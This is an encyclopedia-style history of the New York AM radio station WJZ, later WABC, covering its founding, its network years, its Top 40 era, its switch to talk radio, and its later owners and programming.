WJZ&#x27;s studio and transmitter were initially housed in a shack located on a factory roof that was only accessible by ladder. The station later expanded to a larger studio on the factory&#x27;s ground floor. The station began test transmissions around October 1, 1921, followed, beginning October 5, by broadcasts of the 1921 World Series baseball games. Announcer Thomas H. Cowan in Newark simply relayed the description phoned in from the Polo Grounds baseball field by &quot;Newark Sunday Call&quot; sportswriter Sandy Hunt. (At first station announcers were identified only by initials; in Cowan&#x27;s case as &quot;ACN&quot;, for &quot;Announcer-Cowan-Newark&quot;.)
The station soon expanded to feature a wide variety of live programming. A popular early feature was the &quot;Man in the Moon&quot; bedtime stories, written by Josephine Lawrence and read over the air by Bill McNeary (both were &quot;Newark Sunday Call&quot; employees). Beginning on November 27, 1921, a weekly 90-minute show presented by the Vincent Lopez band was aired.

When it began its broadcast service, WJZ was the only station in the New York City area transmitting on 360 meters. In mid-December 1921 station WDY, operated by the Radio Corporation of America (RCA) from Roselle Park, New Jersey, began sharing the wavelength, with WJZ now broadcasting on Sundays, Tuesdays, Thursdays, and Saturdays, and WDY operating on the other three nights. This soon ended when WDY ceased operations in mid-February 1922 and was merged with WJZ, with RCA now assuming half of WJZ&#x27;s expenses. However, within a few months a large number of additional broadcasting stations began operating on 360 meters, and WJZ was stubborn about having to share &quot;its&quot; wavelength. In May 1922 a proposed time-sharing agreement among 15 local stations assigned more than half of the available airtime to WJZ, but the station did not feel this was sufficient, which in turn led the Radio Broadcasting Society of America to petition that WJZ&#x27;s license be canceled for being uncooperative.

There were no formal standards in the United States defining broadcasting stations until December 1, 1921, when the Department of Commerce—which regulated radio at this time—issued a regulation specifying that stations making broadcasts intended for the general public now had to hold a Limited Commercial license that authorized operation on 360 or 485 meters. WJZ was one of a small number of stations that already met this standard at the time of its adoption. It was also the second-oldest of the two licenses previously issued for the state of New Jersey, preceded by RCA&#x27;s WDY grant. However, WJZ was the first to go on the air, as WDY did not begin operations until 2 months after WJZ&#x27;s debut.

WJZ had difficulty convincing New York City performers – who were not paid – to make the trek to Newark, so on February 5, 1922, a more convenient remote studio was opened at the Waldorf-Astoria, located on Fifth Avenue and 34th Street. The American Telephone &amp; Telegraph Company (AT&amp;T) was unwilling to provide a telephone line to connect the Waldorf-Astoria studio to the Newark transmitter, so the link was instead made using specially prepared telegraph wires provided by Western Union. However, this expedient only provided marginal audio quality, and &quot;the line was so noisy that when Newcomb Carleton, the president of Western Union, broadcast over it, his voice was completely drowned out&quot;.

On March 15, 1922, WJZ broadcast a studio performance of Mozart&#x27;s Impresario, probably the first full-length opera broadcast in the New York City area. In October 1922, the station aired its second World Series, this time also feeding it to WGY in Schenectady, New York. Shortly after midnight on December 9, 1922, WJZ became the first broadcasting station confirmed to have been heard in Europe, consisting of a short program featuring greetings from the British consul in New York to British listeners and Vaughn De Leath singing her &quot;Oliver Twist&quot; song.

===WJZ New York City (1923—1953)===
====Takeover by RCA====

May 15, 1923, saw a number of simultaneous major changes. Most notably, on this day the station moved from Newark to New York City, and the ownership was changed from joint Westinghouse-RCA responsibility to full control by RCA. WJZ moved to studios on the sixth floor of the building where the Aeolian Hall was located, and station publicity heralded the upgrade: &quot;Located in the heart of the city&#x27;s musical and theatrical district, where entertainment of the highest order is ever available, this station will offer to the American public the most elaborate radio programs yet attempted and with a degree of faithfulness in reproduction that marks the beginning of a new era in radio broadcasting.&quot; This was also the day that the Department of Commerce implemented an expansion of the broadcast band, which now consisted of a range of transmitting frequencies from 550 to 1350, with WJZ assigned the sole use of 660. Finally, a sister station with the call letters of WJY operating on 740, was established, which shared the &quot;Broadcast Central&quot; Aeolian Hall studios, with WJZ providing more serious programming, and WJY&#x27;s offerings considered more informal.

Program logs from May 15 to December 31, 1923, show WJZ aired 3,426 programs, including 723 talks, 67 church services, 205 bedtime stories and 21 sports events. Many of the broadcasts were musical and ranged from Carnegie Hall and Aeolian Hall recitals to harmonica and banjo solos.

As part of the move to Aeolian Hall, WJZ&#x27;s transmitting antenna was constructed atop the building, but the location in the middle of New York City proved to be a poor choice. At the end of 1925, the station began operations from a new transmitter site located at Bound Brook, New Jersey. WJZ did not operate regularly at 50,000 watts until 1935.

====Initial network operations====

Westinghouse and RCA&#x27;s original financing plan envisioned that profits from receiver sales would provide the funds for broadcast station operations, but this revenue soon became insufficient. In 1922, AT&amp;T adopted a more practical approach, of selling airtime, which it called &quot;toll broadcasting&quot;, in addition to connecting stations together using telephone lines to form a radio network that could broadcast programs simultaneously to multiple sites. This first radio network was called the &quot;WEAF chain&quot;, named after the flagship AT&amp;T station (later WNBC), located in New York City.

RCA, along with its &quot;radio group&quot; allies of Westinghouse and General Electric, responded by creating a small network of its own, centered on WJZ. Due to AT&amp;T&#x27;s interpretation of a patent-rights cross-licensing agreement, the telephone company claimed the sole right to sell airtime, so WJZ was not able to charge for advertising, and again there were technical limitations, since the network had to use inferior telegraph lines to interconnect its stations.

====NBC-Blue network flagship years====
In the summer of 1926, AT&amp;T decided to withdraw from the broadcasting field, and sold its stations and network operations to RCA. Included with this sale was the right to sell advertising time, and access to telephone lines for radio network connections.
The earlier network operations were reorganized as the National Broadcasting Company (NBC), with the primary network, now known as the NBC Red Network, originating from WEAF. A second network, known as the NBC Blue Network, with WJZ as the originating station, debuted on January 1, 1927. (The WJY sister station was quietly discontinued at this time.) In October 1927, WJZ moved into NBC studios still under construction at 711 Fifth Avenue. A month later, WEAF joined WJZ, and both were together under one roof. On November 11, 1928, as part of a general station reassignment produced by the Federal Radio Commission&#x27;s General Order 40, WJZ moved to 760 kHz.

On March 24, 1932, WJZ claimed to be the first radio station to broadcast a program from aboard a moving train; the station aired a variety show produced aboard a Baltimore and Ohio Railroad passenger train travelling through Maryland. In November 1933, WJZ, WEAF plus the NBC and RCA corporate headquarters moved to 30 Rockefeller Plaza.

In March 1941, under the provisions of the North American Regional Broadcasting Agreement, stations assigned to 760 kHz were shifted to 770 kHz, with WJZ designated as a Class I-A clear-channel station, thus the only station allowed to operate at night on this frequency. However, the following November the Federal Communications Commission (FCC) moved KOB in Albuquerque, New Mexico, which prior to the 1941 reassignment had also been a clear channel station, from 1030 kHz to 770 kHz, after it was found that there was too much nighttime interference between it and WBZ in Boston on their shared frequency. WJZ soon complained about the interference KOB was causing to its distant nighttime coverage, starting a dispute that would last for 38 years. In 1958 the FCC attempted to rectify the matter by designating the now-WABC and KOB as co-equal occupants of 770 kHz, with both stations required to protect each other&#x27;s coverage as &quot;Class I-B&quot; stations. WABC appealed this decision, and through a series of legal battles was ultimately successful in maintaining its status as an unrestricted Class I-A station. In 1976 the FCC designated KOB as a Class II-A, station, requiring it to operate with a directional antenna at night to protect WABC&#x27;s coverage. KOB unsuccessful appealed this on the grounds that it should have been assigned the frequency&#x27;s Class I-A assignment, and the case was finally settled in 1980, with the courts siding with the FCC decision. However, that same year as part of a general review of clear channel operations, the FCC also reduced nighttime protected coverage for clear channel stations from unlimited to 750 miles (1,207 km) from their transmitters, opening up the band to nighttime operation by additional distant stations.

WJZ and the Blue Network presented many of America&#x27;s most popular programs, such as &quot;Lowell Thomas and the News&quot;, &quot;Amos &#x27;n&#x27; Andy&quot;, &quot;Little Orphan Annie&quot;, &quot;America&#x27;s Town Meeting of the Air&quot;, and &quot;Death Valley Days&quot;. Each midday, &quot;The National Farm and Home Hour&quot; brought news and entertainment to rural listeners. Ted Malone read poetry and Milton Cross conveyed children &quot;Coast To Coast on a Bus&quot;, as well as bringing opera lovers the Saturday matinée Metropolitan Opera radio broadcasts. Cross would continue to host the Met on NBC, ABC, CBS and NPR until his passing at the beginning of 1975.

Occasionally, a show would premiere on NBC Blue, which had a weaker lineup of stations nationwide, and be shifted to the Red Network if it grew in popularity. &quot;Fibber McGee and Molly&quot; is one example.

When the FCC limited broadcast stations to 50 kW, a 500 kW transmitter built by RCA for WJZ was no longer allowed. The transmitter was sold by RCA to Britain and used for wartime Black Propaganda; broadcasting as &quot;Soldatensender Calais&quot; a purported German military station.

===Birth of ABC===
In 1942, the FCC ruled that no broadcaster could own more than one AM, one FM and one television station in a single market. On January 23, 1942, the FCC approved the transfer of WJZ&#x27;s operating license from Radio Corporation of America to the Blue Network, Inc. A year later, on October 12, 1943, WJZ and the NBC Blue Network were sold to Edward J. Noble, then the owner of WMCA. This spun off network was simply called &quot;The Blue Network&quot; for little over a year.

On June 15, 1945, &quot;The Blue Network&quot; was officially rechristened the American Broadcasting Company, when negotiations were completed with George B. Storer, who had owned the defunct American Broadcasting System and still owned the name. In November 1948, WJZ and the ABC network finally got a home of their own when studios were moved to a renovated building at 7 West 66th Street.

On March 1, 1953, WJZ changed its call letters to WABC, after the FCC approved ABC&#x27;s merger with United Paramount Theatres, the movie theater chain owned by Paramount Pictures which, like the Blue Network, was divested under government order. The WABC call letters were previously used on CBS Radio&#x27;s New York City AM and FM outlets, reflecting an earlier owner, the Atlantic Broadcasting Company. On November 1, 1946, WABC (AM) changed its call sign to WCBS, and the FM station became WCBS-FM.

In 1957, several years after WJZ&#x27;s callsign change to WABC, Westinghouse Broadcasting acquired WAAM-TV in Baltimore, Maryland, and applied to change the calls to WJZ-TV, in honor of its former pioneer radio station. The FCC waived existing rules and granted this request to restore a three-letter callsign years after being retired on an unrelated station in a different market, albeit with a &quot;-TV&quot; suffix (perhaps because Westinghouse was highly regarded as a licensee by both the industry and the FCC at that time), and the Baltimore TV station, now owned and operated by CBS, retains the call letters to this day.

===WABC&#x27;s first era (1953–1960)===

Although WABC continued to air ABC programming during this time, ABC Radio – like the other major radio networks of that era – began to drop significant amounts of long-form comedy and dramatic programming, many of which migrated over to television. In response, WABC began using deejays playing recorded music in greater frequency. Some programs featured middle of the road music, including Broadway and Hollywood showtunes and popular music, while other portions of the schedule included ABC Radio&#x27;s remaining long–form newscasts and dramatic program lineup, in tandem with CBS Radio&#x27;s WCBS and NBC Radio&#x27;s WNBC.

(This would continue until 1960, as the Musicradio 77 era formally began, but WABC was still required to carry several of ABC Radio&#x27;s non–music and entertainment shows, including the long–running &quot;Don McNeill&#x27;s Breakfast Club&quot; during the 10:00 am hour, and a long–form news block in the afternoon–drive period. While this was not an issue prior to 1960, such commitments created a programming clash with the Top 40 format up until the network was dissected into four sub–networks in 1968.)

In 1958–1959, legendary rock&#x27;n&#x27;roll disk jockey Alan Freed hosted a daily evening show on WABC, which was similar in format and musical policy to the early rock shows he had gained fame with on WJW in Cleveland, and later WINS in New York. Freed&#x27;s time at WABC ended when he was caught up in the investigation of the &quot;payola&quot; scandals of the era; he was terminated in November 1959. Although payola was not illegal at the time, the termination occurred because Freed had refused to sign a statement admitting that he had accepted bribes.

At different times in the pre-top-40 era, famed comedian Ernie Kovacs and dean of early disc jockeys Martin Block were heard on the station.

===The Musicradio 77 era (1960–1982)===
====Early years====

When Harold L. Neal, Jr. was named general manager of WABC, he was charged with making WABC successful in terms of both audience and profits. Neal had been at WXYZ in Detroit. By 1960, WABC was committed to a nearly full-time schedule of top-40 songs played by upbeat personalities. Still, WABC played popular non-rock and roll songs as well, provided they scored well on the Top 40 charts. WABC&#x27;s early days as a Top 40 station were humble ones.

WINS was the No. 1 hit music station and WMCA, which did a similar rock leaning top 40 format, was also a formidable competitor, while WABC barely ranked in the Top Ten. Fortunately for WABC, the other Top 40 outlets could not be heard as well in more distant New York and New Jersey suburbs, since WINS, WMGM, and WMCA were all directional stations. WABC, with its 50,000-watt non-directional signal, had the advantage of being heard in places west, south, and northwest of New York City, a huge chunk of the growing suburban population and this is where the station began to draw ratings. Early in 1962, WMGM, owned by Loew&#x27;s, which then owned MGM, was sold to Storer Broadcasting. Upon its sale, WMGM reverted to its original WHN call letters and switched to a middle of the road music format playing mostly non-rock artists such as Frank Sinatra, Nat King Cole and Andy Williams.

Sam Holman was the first WABC program director of this era. Under Holman, WABC achieved No. 1 ratings during much of 1962, after WMGM reverted to WHN. By the summer of 1963, WMCA led the pack among contemporary stations, with WABC at No. 2 and WINS slipping to third place. It has been said, but is difficult to verify, that WMCA dominated in the city proper, while WABC owned the suburbs. This would be consistent with WMCA&#x27;s 5,000-watt directional signal.

====Dominant years====
Hal Neal hired Rick Sklar as WABC&#x27;s program director. He would go on to become a member of the National Radio Hall of Fame and be credited as one of the pioneering architects of the Top 40 format. Under Sklar, the station went to the shortest playlist of any contemporary music station in history. The number one song was heard about every hour during the day and every 75 minutes or so at night. The other top 5 songs were heard nearly as often. Other current songs averaged once to twice per airshift. The station played about 9 current hits per hour and several non-current songs. The non-currents were no more than 5 years old and the station played about 70 of them in total. In his book &quot;Rockin&#x27; America&quot;, Sklar said he was sensitive to payola concerns and advanced airplay. Through the years, WABC was known by various slogans, &quot;Channel 77 WABC&quot; and later &quot;Musicradio 77 WABC&quot;. Due to the high number of commercials each hour, WABC played no more than two songs in a row and there was frequent DJ talk and personality between every song. The station averaged 6 commercial breaks per hour but they were no more than 3 ads in a row. Often the air personalities delivered live commercials in their own humorous style, so that listeners would consider the spot part of the entertainment.
In addition, between songs, disc jockeys were required to provide so-called program matter. Program matter could include a time check, a weather report or simply some disc jockey banter, which enabled the disc jockeys to inject their personalities and humor into their shows.

Early 1960s disc jockeys included Dan Ingram, Herb Oscar Anderson, Charlie Greer, Scott Muni, Chuck Dunaway, Jack Carney, Bruce &quot;Cousin Brucie&quot; Morrow and Bob &quot;Bobaloo&quot; Lewis. But some of the best known WABC DJs are the ones that followed them in the mid-1960s and 1970s: Harry Harrison, Ron Lundy, Chuck Leonard (one of the earliest African-American DJs to be on the staff of a major mainstream radio station), Johnny Donovan, Bob Cruz (a Dan Ingram sound alike), Frank Kingston Smith, Roby Yonge, George Michael, Jim Nettleton, Jim Perry and Steve O&#x27;Brien. Meanwhile, &quot;Radio Hall of Fame&quot; member Dan Ingram, perhaps WABC&#x27;s best known DJ, was held over from the early staff, being heard in the afternoon for much of WABC&#x27;s Top 40 history. Noted sportscaster Howard Cosell did a brief weekday evening sportscast on WABC, as well as hosting a late Sunday night interview show called &quot;Speaking of Everything&quot;.

Especially in the afternoons and evenings, WABC was the station that teenagers could be heard listening to on transistor radios all over the New York metropolitan area. Due to its strong signal, the station could be heard easily over 100 miles away, including the Catskill and Pocono Mountains, and through much of Connecticut and Rhode Island. After sunset, when AM radio waves travel farther, WABC&#x27;s signal could be picked up around much of the Eastern U.S. and Canada. Bruce Morrow often spoke about how he felt an almost psychic bond to his young listeners.

An aircheck of WABC from August 1964, features some of the DJs speaking from a window of The Beatles&#x27; hotel room at the Hotel Delmonico during their second visit to New York City, while Dan Ingram, back in the studio, played WABC jingles to thousands of teenagers in the streets below, who enthusiastically sang along with them. Ingram later noted that this was actually illegal under FCC rules, but said that they did not know it at the time. In the wake of the success of &quot;W-A-Beatle-C&quot; (as it was briefly called around the time of the Beatles&#x27; U.S. visit), competitor WINS finally dropped out of the Top 40 battle in 1965, adopting an all-news format. The ABC television network also called itself &quot;A-Beatles-C&quot; whenever it promoted airings of Beatles-related films.

Just before the famous Northeast blackout of 1965, Dan Ingram noted that the studio&#x27;s electric power was fluctuating and he began having fun with the slowed-down music. After playing &quot;Everyone&#x27;s Gone to the Moon&quot; by Jonathan King, he quipped it was played &quot;in the key of R&quot;. Ingram then proceeded to run some recorded commercials and a portion of Si Zentner&#x27;s &quot;Up a Lazy River&quot;, backtimed to the news, while commenting on how everything seemed to be running slower than normal. During the 6 pm newscast, WABC left the air as the outage settled in for real. Ingram later drove out to the transmitter site in Lodi, New Jersey, with a box of records, and continued his show from the backup studio housed there.

In the 1970s, WABC was either No. 1 or No. 2 consistently, often trading places with WOR. Once in a while, a station attracting an older audience (like WOR or WPAT) would move into the top spot. These stations were not truly WABC&#x27;s direct competitors because they targeted a much older audience. Chief competitor WMCA began running evening talk by 1968 and stopped playing top 40 music altogether in the fall of 1970. Then in 1971, Country Music station WJRZ abruptly flipped to a Top 40 format and became known as WWDJ. That lasted until April 1974. WOR-FM evolved from progressive rock to Adult Top 40 playing the hits of 1955 to current product by 1968. They dropped most pre-1964 oldies in 1972 and became known as WXLO 99X. That station evolved into more on an Adult Contemporary format in 1979 and a Rhythmic Top 40 format in 1980. Other FM competitors like oldies station WCBS-FM, soul station WBLS, and album-oriented rock stations like WPLJ and WNEW-FM all did well in the ratings, but none rivalled WABC&#x27;s success. AM competitor WNBC also never came close to WABC&#x27;s audience during this period. WNBC then had a format similar to 99X playing Adult Top 40. In 1977, WNBC tried sounding younger and moved its format musically closer to WABC. Then by 1979 they tried sounding older and somewhere in-between. Until 1978, WABC remained dominant.

WABC&#x27;s ratings strength came from its cumulative audience, what the radio industry calls &quot;cume&quot;. Most listeners did not stay with WABC for long periods of time, as the station had some of the shortest &quot;time spent listening&quot; (or TSL) spans in the history of music radio—an average listener spent about 10 minutes listening to WABC. It was the price paid for a short playlist, and numerous commercials between songs (the large number of ads being due to WABC&#x27;s large audience), but what WABC lacked in TSL it more than made up for with its sheer number of listeners. By 1975, WABC tried becoming more music-intensive, reducing commercial breaks to three per hour. It began playing 3 to 5 songs in a row, still mixed with talk and personality, but done in a tighter manner.

Fed up with the short playlist, Cousin Brucie left in August 1974 to defect to rival WNBC. Rick Sklar was promoted in 1976 to vice president of programming for ABC Radio, and his assistant program director Glenn Morgan became WABC&#x27;s program director. The station&#x27;s influence could be found in odd places: Philip Glass&#x27; 1976 opera, &quot;Einstein on the Beach&quot;, has as part of the background a recitation of WABC&#x27;s DJ schedule in the 1960s.

====&quot;Disco&quot; era====
The end of the 1970s found FM radio beginning to overtake AM music stations in most markets. In June 1975, an FM station on 92.3, owned by the San Juan (Puerto Rico) Racing Association flipped to Soft Rock and became known as Mellow 92 WKTU. That station had very low ratings and had no effect on WABC. But on July 24, 1978, at 6 pm, WKTU abruptly dropped its Soft Rock format in favor of a disco-based top 40 format known as &quot;Disco 92&quot;. By December of that year, WABC was unseated, as WKTU became the No. 1 station in New York City. The first &quot;disco&quot; ratings saw WKTU with 11 percent of the listening audience—a huge number anywhere, let alone in a market the size of New York City—and WABC dropping from 4.1 million listeners to 3 million, losing 25 percent of its audience practically overnight, and in February 1979, the station started broadcast in C-QUAM AM Stereo.

After this initial ratings tumble, WABC panicked and began mixing in several extended disco mixes per hour and sometimes played two back-to-back. Some of the disco songs ran in excess of eight minutes. What regular listeners heard was a major change in sound. While the station continued playing non-disco and rock songs about a third of the time, the station&#x27;s familiar format had seemed to disappear and as a result, WABC began to lose its identity. In late spring 1979, &quot;Billboard&quot; magazine reported that Rick Sklar had demoted program director Glenn Morgan to &quot;moving carts&quot; instead of making programming decisions. WABC&#x27;s numbers dropped for four consecutive ratings periods.

On August 2, 1979, the Donna Summer disco hit &quot;MacArthur Park&quot; was playing during Dan Ingram&#x27;s afternoon drive program. During the song, DJ George Michael (who also was a sports reporter) interrupted to break the news that New York Yankees catcher and team captain Thurman Munson had died in a plane crash. In late summer, WABC moved, temporarily, back to its tight playlists.

That fall, Al Brady took over as programming director of WABC. He had come from WHDH Boston, where he evolved that station from MOR to more of an adult contemporary music format. At WABC, he added a huge amount of music and went as far back as 1964. He added The Beatles, Motown 1960s hits, 1970s rock hits, a few album rock cuts, and basically deepened WABC&#x27;s music. The same amount of current hits still got played but less often and about 40%. That November, he let Harry Harrison, George Michael, and Chuck Leonard go. He made a couple shifts longer, moved Dan Ingram to mornings, moved Bob Cruz from overnights to afternoons, and hired Howard Hoffman for evenings. For overnights he hired Sturgis Griffin and eliminated the late night shift merging that with evenings and overnights. In the first six months of 1980, ratings were slightly up and stable. Also, Brady made a deal for WABC to air New York Yankees baseball beginning the next year in 1981, though the station carried a few Yankee games from 1010 WINS during Republican Convention week in 1980. It was the first sign of the beginning of the end for the music format of WABC.

====&quot;77 WABC, New York&#x27;s Radio Station&quot; and the transition to talk====
Brady left WABC in July 1980 and soon became general manager of WYNY, which by then had a similar format to its sister station WNBC, as well as WABC. That fall, Jay Clark took over as program director at WABC, and Jeff Mazzei arrived as assistant program director from WNEW (which was moving from adult contemporary to big bands and standards).

Under Clark, the station played current music leaning toward a more Adult Contemporary sound, trying to appeal to a slightly older audience, as most younger listeners were listening to FM stations. Part of the reason was the top 40 chart was leaning that way at that point as well. WABC still played rock and soul crossovers in moderation, but began to move away from album cuts and more toward 1960s and 1970s oldies. In September 1980, they also dropped the &quot;Musicradio WABC&quot; slogan and became &quot;77 WABC, New York&#x27;s Radio Station&quot; (though they called themselves New York&#x27;s radio station at times as Musicradio), the apparent implication being that the station was more than just music.

By early 1981, WABC&#x27;s cumulative audience was down to 2.5 million—rival WNBC, a perennial also-ran, was by this time beating them with 3 million. Fewer people were tuning into WABC, listeners who had switched to FM were not coming back, and, while still moderately successful, the ship was sinking. Like Brady, Clark tried to improve the time-spent-listening. In March 1981, Cruz departed, Ingram went back to afternoon drive time, and the team of Ross Brittain and Brian Wilson from Atlanta moved into morning drive. &quot;Ross and Wilson&quot;, as the show was known, was very information-oriented, playing exactly four songs in an hour except on Saturdays when they played the usual 12 or so songs an hour. A week later, the station also began airing a weeknight sports-talk show with Art Rust, Jr. from 7:00p.m. to 9:00p.m. WABC&#x27;s ratings by this point were mediocre and they were still going down.

Also, that March, WABC became the full-time flagship radio outlet for Yankees baseball games, a distinction the station carried through the end of the 2001 season. This would be the longest continuous relationship the team would have with any flagship station (to date). Clark reasoned that Yankee baseball would bring back some listeners to the station and that they would recycle back into the music format, but not even the &quot;Bronx Bombers&quot; could save music on WABC.

In the fall of 1981, WABC dropped the remaining heavy-rock cuts and non-crossover urban hits, and began playing more oldies, as well as songs from the adult contemporary chart, and added an &quot;advice&quot; talk show with Dr. Judy Kuriansky from 9:00p.m. to midnight on weeknights. Hoffman and Griffin exited at this point. By then, WABC was almost unrecognizable as a Top 40 station, the ratings were languishing, and rumors, which began as far back as 1979 were rampant that the station would be changing its format to talk and news sooner or later. By early 1982 it looked sooner than later. The management at ABC denied the rumors but did state that plans were to modify WABC into a full service AC format with music by day and talk evenings and overnights like KDKA in Pittsburgh was doing. Once a week beginning in February, WABC was auditioning prospective talk shows for the Midnight to 2:00a.m. time slot.

In February 1982, WABC officially confirmed it would be going to an all-talk format that May and stated that there would be ample notice before the switch happened. At that point the once-a-week overnight auditions for talk shows ended and WABC continued playing music overnights until the switch. The airstaff began saying goodbye with a comment here and there. Finally, on April 30, it was announced that the switch to all-talk would occur on May 10 at noon. From May 7 to 9, the departing air-staffers said their goodbyes one last time. The official music format ended 10:45 p.m. on May 9, 1982. The station aired a Yankee game that day at Seattle. From 2:00 a.m. to 5:30 a.m. they ran the normal Sunday evening public affairs programs preempted due to the Yankee game. Ross &amp; Wilson played their usual 4 songs. Staffers that departed included Lundy, Ingram, Marc Sommers and Peter Bush. Mazzei left for a similar position at WCBS-FM where he would stay for well over 25 years. Sommers also went to WCBS-FM and eventually Lundy and Ingram would join him there. Donovan and Mike McKay remained at WABC as staff announcers and producers. McKay left WABC in 1984 for RKO Radio Network and Donovan stayed at WABC until his retirement in 2015.

Monday, May 10, 1982, the day WABC stopped playing music, is sometimes called &quot;The Day the Music Died&quot;. WABC ended its 22–year run as a music station with a 9:00a.m.–noon farewell show hosted by Ingram and Lundy. The last song played on WABC before the format change was &quot;Imagine&quot; by John Lennon, followed by the familiar WABC &quot;Chime Time&quot; jingle, then a few seconds of silence followed by a minute jingle for talk radio before the debut of the new talk format.

===The NewsTalkRadio 77 era (1982–present)===
====Early years and success====

Initially after the format change, the station ran satellite talk shows from corporate ABC&#x27;s &quot;Talk Radio&quot; network. Initially, WABC&#x27;s lineup consisted of Ross and Wilson until 10 am, Owen Spann from Satellite until noon, Art Athens and News until 1 pm, Money Management talk until 2 pm, Los Angeles-based host Michael Jackson (no relation to the pop star) from satellite until 4 pm, another advice show with Dr. Toni Grant from satellite until 6 pm, and ending with a half-hour of news at 6. Sports Talk began at 6:30 p.m. and remained on until 9 pm. Doctor Judy remained in her time slot. Overnights were hosted by Alan Colmes, who played some music initially, but stopped doing so by mid-1983. At that time, Colmes was less politically based and more entertainment-based. Weekends had Child Psychology advice shows (Dr. Lawrance Balter), Home and Garden shows, talk about religion (&quot;Religion on the Line&quot;), and of course, the Yankees.

Ross and Wilson stayed on and continued to play 4 songs per hour (mostly 1960s and 1970s hits but also some currents) throughout 1982. In 1983, they stopped playing music as well. Ross and Wilson split up in 1983 when Ross went over to WHTZ. While the station&#x27;s final ratings as a music station were mediocre, its talk ratings initially were even lower. Jay Clark was terminated and replaced with then assistant program director, Mark Mason.

Still, the station stuck with the new format. After Brian Wilson left in 1984, Alan Colmes moved to mornings. Mark Mason left for a similar post at All-News WINS. He was replaced by John Mainelli and at that point they dropped satellite programming. They added more issues-oriented talk shows, with an increasing number of conservative talk show hosts, although several liberals, including Colmes and Lynn Samuels, also hosted shows. The ratings grew and by the late 1980s, they were a very successful talk station.

From 1984 to 1996 WABC broadcast the popular Bob Grant, a controversial, early &quot;right-wing&quot; talk radio host. After years of what many considered inflammatory remarks, he was fired in 1996 for a controversial comment regarding the death of United States Secretary of Commerce Ron Brown. After a number of years at competitor station WOR, Grant returned as a host as of July 2007, was removed again in December 2008, and returned again as a weekend host in September 2009. Alan Colmes would leave in 1985 and by 1987 he emerged at WNBC on overnights, where he played moderate amounts of music. He would move to afternoons on WNBC and eventually drop music there as well. He was on the air at WNBC&#x27;s sign off in 1988. Colmes eventually returned to WABC.

Within its first years, the revamped WABC brought in Rush Limbaugh, who would go on to be the anchor program of the local station for two decades, and soon after the giant of talk syndication, the model for countless other conservative radio shows to follow. In the early 1990s Phil Boyce took over as program director.

Starting in 1997, civil rights attorney Ron Kuby and Guardian Angels&#x27; founder Curtis Sliwa co-hosted a WABC radio show on Monday through Friday from 6 to 7 p.m, and on Saturdays from 6 to 10 am.

On Saturday, September 8, 2001, John Batchelor presented a four-hour program on the attack on the USS &quot;Cole&quot;, identifying Osama bin Laden as the probable perpetrator. On September 12, Batchelor was invited to broadcast on WABC &quot;until bin Laden is captured&quot;. The day bin Laden was caught, Batchelor and his executive producer were in Cracow; they continued on air and, with a hiatus in 2006, have been on air ever since, covering national and international security.

In 2004, the station earned the distinction of being a news/talk radio station even longer than it had been a Top 40 station, by marking 22 years in its present format.

====Under Citadel and Cumulus====

On February 6, 2006, the Walt Disney Company announced that it would sell WABC and other radio properties not affiliated with either Radio Disney or ESPN Radio, along with ABC Radio&#x27;s News &amp; Talk and FM networks, to Citadel Broadcasting for $2.7 billion. The transaction became final on June 12, 2007. Citadel merged with Cumulus Media on September 16, 2011.

In December 2007, Don Imus moved his program &quot;Imus in the Morning&quot; to WABC after 19 years at WFAN. Imus was fired from WFAN in April for controversial comments about Rutgers University&#x27;s women&#x27;s basketball team. Connell McShane (who had replaced Charles McCord following his retirement on May 5, 2011) served as sidekick and newscaster for the program, which was also simulcast on the Fox Business network. The Imus show aired for the final time on March 29, 2018.

In February 2010, WABC added Rabbi Shmuley Boteach and &quot;The Shmuley Show&quot; as a weekend program.

Geraldo Rivera became host of WABC&#x27;s 10 a.m. to noon slot beginning January 3, 2012, replacing Joe Crummey. He was replaced with Fox News Radio&#x27;s Brian Kilmeade in 2019.

On January 1, 2013, the traffic reports on WABC switched from Clear Channel&#x27;s Total Traffic to Radiate Media&#x27;s Right Now Traffic.

Limbaugh and Hannity departed WABC at the end of 2013. To fill Limbaugh&#x27;s spot, WABC revived &quot;Curtis and Kuby&quot;. Curtis Sliwa had been hosting the morning show at WNYM since his departure from WABC, while Ron Kuby had for the most part been a commentator on various news shows since his show on Air America Radio was cancelled. Kuby was laid off in 2017; Sliwa would subsequently be paired on-air with Rita Cosby, followed by current co-host Juliet Huddy.

===Acquisition by Red Apple Media===

On June 27, 2019, Red Apple Media, which is owned by John Catsimatidis, bought WABC from Cumulus Media for $12.5 million in cash. The sale closed on March 2, 2020. On July 1, 2020, Red Apple Media took over WLIR-FM in Long Island under a local marketing agreement, and converted it to a simulcast of WABC. As it is already cleared by WRCN-FM, Brian Kilmeade&#x27;s program is substituted by a local program hosted by Frank Morano. Morano was also added to WABC&#x27;s main lineup on Sunday nights beginning July 12, and began hosting an overnight show, &quot;The Other Side of Midnight&quot;, in October 2020 (replacing &quot;Red Eye Radio&quot;).

==Previous programs==

WABC was where the nationally syndicated programs hosted by Rush Limbaugh and Sean Hannity got their start, although those programs are now heard on WABC&#x27;s talk radio rival in New York, WOR. Limbaugh&#x27;s show was produced at WABC from 1988 until the early 2000s, when he started doing the program from Premiere Radio Networks and a studio in his home in South Florida (even then, until WABC dropped the program, substitute hosts for Limbaugh still used the WABC studios, and Limbaugh on occasion had hosted from WABC).. The station also served as the flagship for &quot;Imus in the Morning&quot; with Don Imus from 2007 to 2018. Imus&#x27; producer, Bernard McGuirk, co-hosted the WABC morning show following Imus&#x27;s retirement until his own death in October 2022.

Although the station had good ratings, it underperformed in terms of total revenue, an example being WABC billing $21.3 million in 2008, not even close to industry giant KFI in Los Angeles at $54.4 million.

Phil Boyce departed as program director in October 2008, eventually replaced in February 2009 by former XM Satellite Radio programmer Laurie Cantillo. Laurie Cantillo resigned on October 31, 2011. Chuck Armstrong was named interim program director in November 2011. Craig Schwalb was named program director in January 2014.

==Programming==
===Weekdays===
The station features a lineup of conservative talk shows, including WABC personalities Sid Rosenberg, Rita Cosby, Dominic Carter, Bo Snerdley, and station owner John Catsimatidis. The station also airs Brian Kilmeade, Greg Kelly, Curtis Sliwa, Bill O&#x27;Reilly and &quot;The Mark Levin Show&quot;. Local top-of-the-hour newscasts are also heard.

===Sports programming===

WABC currently does not carry any sports programming. The station&#x27;s most recent sports contract, with the United States Military Academy for Army football games, expired at the end of the 2015 season. In addition to the aforementioned Yankees coverage, the station served two separate stints as the flagship for the New York Jets and was also the home of the New Jersey Devils beginning in 1988. WABC also previously carried Seton Hall University men&#x27;s basketball.

